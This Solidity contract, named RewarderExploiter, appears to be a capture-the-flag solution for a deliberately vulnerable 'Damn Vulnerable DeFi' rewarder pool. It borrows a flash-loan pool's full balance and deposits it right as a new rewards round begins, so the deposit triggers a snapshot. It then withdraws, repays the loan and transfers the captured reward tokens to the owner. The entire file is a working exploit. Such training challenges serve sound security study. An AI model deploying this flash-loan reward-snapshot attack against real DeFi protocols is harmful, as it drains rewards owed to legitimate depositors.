// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function isNewRewardsRound() external view returns (bool);
}

contract RewarderExploiter {

    using Address for address;

    DamnValuableToken private liquidityToken;
    IRewarderPool private rewarderPool;
    address private flashLoanPoolAddress;
    address private owner;

    constructor(
        address _liquidityTokenAddress, 
        address _rewarderPool, 
        address _flashLoanPool
    ) {
        liquidityToken = DamnValuableToken(_liquidityTokenAddress);
        rewarderPool = IRewarderPool(_rewarderPool);
        flashLoanPoolAddress = _flashLoanPool;
        owner = msg.sender;
    }

    // @dev exploit only works if this contract is first to call deposit after REWARDS_ROUND_MIN_DURATION passes
    function runExploit(address _rewardToken) external {
        require(rewarderPool.isNewRewardsRound(),"exploit unavailable."); // check exploit condition

        flashLoanPoolAddress.functionCall(abi.encodeWithSignature(
                                              "flashLoan(uint256)",
                                              liquidityToken.balanceOf(flashLoanPoolAddress)
                                          )); // request entire balance of flashLoan pool

        IERC20(_rewardToken).transfer(owner,IERC20(_rewardToken).balanceOf(address(this)));
    }

    // @dev flashLoan callback
    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == flashLoanPoolAddress,"invalid callback.");

        liquidityToken.approve(address(rewarderPool),amount);

        rewarderPool.deposit(amount); // calls _recordSnapshot
        rewarderPool.withdraw(amount);

        liquidityToken.transfer(msg.sender, amount);
    }

}